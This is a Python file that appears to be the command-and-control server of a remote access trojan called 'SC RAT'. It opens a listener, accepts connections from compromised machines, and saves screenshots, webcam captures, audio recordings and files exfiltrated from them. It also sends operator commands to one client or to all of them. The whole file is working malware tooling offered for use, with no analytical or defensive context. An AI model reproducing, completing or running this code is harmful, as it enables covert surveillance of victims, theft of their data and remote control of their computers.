# -----------------------------------------------------------------------------
# Copyright (c) 2025 pxwild. All Rights Reserved.
# pxwild PROPRIETARY AND CONFIDENTIAL — NOT FOR MODIFICATION OR REDISTRIBUTION.
#
# This software and its source code are proprietary to pxwild. Unauthorized
# copying, modification, distribution, decompilation, reverse engineering, or
# creation of derivative works is strictly prohibited without prior written
# permission from pxwild. Any attempt to modify or remove this notice is a
# material breach of the license and will be acted upon to the fullest extent
# permitted by law.
# -----------------------------------------------------------------------------

import socket
import threading
import os
from colorama import Fore, init
import ctypes
import time

init()

clients = {}

def logo():
    print(f"{Fore.CYAN}")
    print(" ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄      ")
    print("█      █ █   █    █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ ▐  ▄▀   ▐ █ █    ▌     ")
    print("█      █ ▐  █    █    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄     █▄▄▄▄▄  ▐ █          ")
    print("▀▄    ▄▀    █   ▄▀    █    ▌   ▄▀    █  ▀▄   █    █    ▌    █          ")
    print("  ▀▀▀▀       ▀▄▀     ▄▀▄▄▄▄   █     █    █▀▀▀    ▄▀▄▄▄▄    ▄▀▄▄▄▄▀     ")
    print("                     █    ▐   ▐     ▐    ▐       █    ▐   █     ▐      ")
    print("                     ▐                           ▐        ▐            ")
    print(f"{Fore.RESET}")
    print(f"{Fore.YELLOW}╔════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                     SERVER CONTROL PANEL                       ║")
    print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════════╝{Fore.RESET}")

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"SC RAT | CONNECTED CLIENTS: {len(clients)}")
    
    while True:
        try:
            raw_data = client_socket.recv(8192)
            if not raw_data:
                break
            
            if raw_data.startswith(b"SCREENSHOT_SIZE:"):
                try:
                    size_info = raw_data.decode('utf-8')
                    screenshot_size = int(size_info.split(":")[1])
                    
                    print(f"\n{Fore.CYAN}[{addr[0]} Screenshot]: {Fore.RESET}Receiving {screenshot_size} bytes...")
                    
                    received_data = b""
                    while len(received_data) < screenshot_size:
                        chunk = client_socket.recv(min(8192, screenshot_size - len(received_data)))
                        if not chunk:
                            break
                        received_data += chunk
                    
                    if len(received_data) == screenshot_size:
                        filename = f"screenshot_{addr[0]}_{int(time.time())}.png"
                        current_dir = os.path.dirname(os.path.abspath(__file__))
                        if current_dir:
                            filepath = os.path.join(current_dir, filename)
                        else:
                            filepath = filename
                        
                        with open(filepath, 'wb') as f:
                            f.write(received_data)
                        print(f"{Fore.GREEN}[{addr[0]} Screenshot]: {Fore.RESET}Saved as {filepath}")
                    else:
                        print(f"{Fore.RED}[{addr[0]} Screenshot]: {Fore.RESET}Failed - received {len(received_data)}/{screenshot_size} bytes")
                        
                except Exception as e:
                    print(f"{Fore.RED}[{addr[0]} Screenshot]: {Fore.RESET}Error: {e}")
            
            elif raw_data.startswith(b"WEBCAM_SIZE:"):
                try:
                    size_info = raw_data.decode('utf-8')
                    webcam_size = int(size_info.split(":")[1])
                    
                    print(f"\n{Fore.CYAN}[{addr[0]} Webcam]: {Fore.RESET}Receiving {webcam_size} bytes...")
                    
                    received_data = b""
                    while len(received_data) < webcam_size:
                        chunk = client_socket.recv(min(8192, webcam_size - len(received_data)))
                        if not chunk:
                            break
                        received_data += chunk
                    
                    if len(received_data) == webcam_size:
                        filename = f"webcam_{addr[0]}_{int(time.time())}.png"
                        current_dir = os.path.dirname(os.path.abspath(__file__))
                        if current_dir:
                            filepath = os.path.join(current_dir, filename)
                        else:
                            filepath = filename
                        
                        with open(filepath, 'wb') as f:
                            f.write(received_data)
                        print(f"{Fore.GREEN}[{addr[0]} Webcam]: {Fore.RESET}Saved as {filepath}")
                    else:
                        print(f"{Fore.RED}[{addr[0]} Webcam]: {Fore.RESET}Failed - received {len(received_data)}/{webcam_size} bytes")
                        
                except Exception as e:
                    print(f"{Fore.RED}[{addr[0]} Webcam]: {Fore.RESET}Error: {e}")
            
            elif b"FILE_START:" in raw_data:
                try:
                    file_data = raw_data.split(b"FILE_START:")[1].split(b":FILE_END")[0]
                    filename = f"downloaded_file_{addr[0]}_{int(time.time())}.bin"
                    current_dir = os.path.dirname(os.path.abspath(__file__))
                    if current_dir:
                        filepath = os.path.join(current_dir, filename)
                    else:
                        filepath = filename
                    
                    with open(filepath, 'wb') as f:
                        f.write(file_data)
                    print(f"\n{Fore.GREEN}[{addr[0]} File]: {Fore.RESET}Saved as {filepath}")
                except Exception as e:
                    print(f"{Fore.RED}[{addr[0]} File]: {Fore.RESET}Error: {e}")
            
            elif b"AUDIO_START:" in raw_data:
                try:
                    audio_data = raw_data.split(b"AUDIO_START:")[1].split(b":AUDIO_END")[0]
                    filename = f"recorded_audio_{addr[0]}_{int(time.time())}.wav"
                    current_dir = os.path.dirname(os.path.abspath(__file__))
                    if current_dir:
                        filepath = os.path.join(current_dir, filename)
                    else:
                        filepath = filename
                    
                    with open(filepath, 'wb') as f:
                        f.write(audio_data)
                    print(f"\n{Fore.GREEN}[{addr[0]} Audio]: {Fore.RESET}Saved as {filepath}")
                except Exception as e:
                    print(f"{Fore.RED}[{addr[0]} Audio]: {Fore.RESET}Error: {e}")
            
            else:
                try:
                    response = raw_data.decode('utf-8')
                    if response:
                        print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
                except UnicodeDecodeError:
                    if len(raw_data) > 10:
                        print(f"\n{Fore.YELLOW}[{addr[0]} Binary Data]: {Fore.RESET}{len(raw_data)} bytes received")
                    
        except (ConnectionResetError, BrokenPipeError):
            break
    
    print(f"\n[{Fore.RED}!{Fore.RESET}] Client {addr[0]} disconnected.")
    client_socket.close()
    if addr in clients:
        del clients[addr]
    ctypes.windll.kernel32.SetConsoleTitleW(f"SC RAT | CONNECTED CLIENTS: {len(clients)}")

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        print(f"\n[{Fore.GREEN}+{Fore.RESET}] Client {addr[0]}:{addr[1]} connected.")
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    os.system("cls")
    logo()
    
    print(f"{Fore.CYAN}[*]{Fore.RESET} Listening on {Fore.YELLOW}{host}:{port}{Fore.RESET}")
    print(f"{Fore.CYAN}[*]{Fore.RESET} Files will be saved in: {Fore.YELLOW}{os.path.dirname(os.path.abspath(__file__)) or os.getcwd()}{Fore.RESET}")
    print(f"{Fore.CYAN}[?]{Fore.RESET} Waiting for clients to connect... {Fore.YELLOW}(might take 5-10 seconds){Fore.RESET}")
    print(f"{Fore.CYAN}────────────────────────────────────────────────────────────────────{Fore.RESET}")
    
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    
    while True:
        if not clients:
            continue
            
        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════════╗")
        print(f"║                     CONNECTED CLIENTS [{len(clients)}]                      ║")
        print(f"╚════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{Fore.CYAN}[{idx}]{Fore.RESET} {addr[0]}:{addr[1]}")
        
        print(f"\n{Fore.YELLOW}Options:{Fore.RESET}")
        print(f"{Fore.CYAN}[0]{Fore.RESET} Broadcast command to all clients")
        print(f"{Fore.CYAN}[1-{len(clients)}]{Fore.RESET} Select specific client")
        print(f"{Fore.CYAN}[r]{Fore.RESET} Refresh list")
        
        try:
            choice = input(f"\n{Fore.GREEN}Select option ➜ {Fore.RESET}").strip().lower()
            
            if choice == 'r':
                continue
                
            choice = int(choice)
            if choice == 0:
                command = input(f"{Fore.YELLOW}Enter command to send (broadcast) ➜ {Fore.RESET}")
                for client in clients.values():
                    client.send(command.encode())
                print(f"{Fore.GREEN}[✓]{Fore.RESET} Command sent to all clients")
            elif 1 <= choice <= len(clients):
                target_addr = list(clients.keys())[choice - 1]
                command = input(f"{Fore.YELLOW}Enter command to send to {target_addr[0]} ➜ {Fore.RESET}")
                clients[target_addr].send(command.encode())
                print(f"{Fore.GREEN}[✓]{Fore.RESET} Command sent to {target_addr[0]}")
            else:
                print(f'{Fore.RED}[!]{Fore.RESET} Invalid selection.')
        except ValueError:
            print(f'{Fore.RED}[!]{Fore.RESET} Please enter a valid number.')
        except Exception as e:
            print(f'{Fore.RED}[!]{Fore.RESET} Error: {e}')

if __name__ == '__main__':
    start_server("0.0.0.0", 5555)
